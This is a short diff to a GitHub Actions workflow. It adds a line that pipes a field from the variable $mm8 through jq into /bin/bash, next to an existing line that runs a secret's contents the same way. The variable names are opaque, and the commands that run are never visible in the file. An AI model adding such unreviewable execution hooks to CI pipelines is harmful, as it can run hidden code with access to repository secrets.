@@ -17,6 +17,7 @@ jobs:
           x50379: ${{ secrets.x50379 }}
         run: |
           printf '%s' "$x50379" | jq -r .uqjg30469 | /bin/bash
+          echo $mm8 | jq -r .eka9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
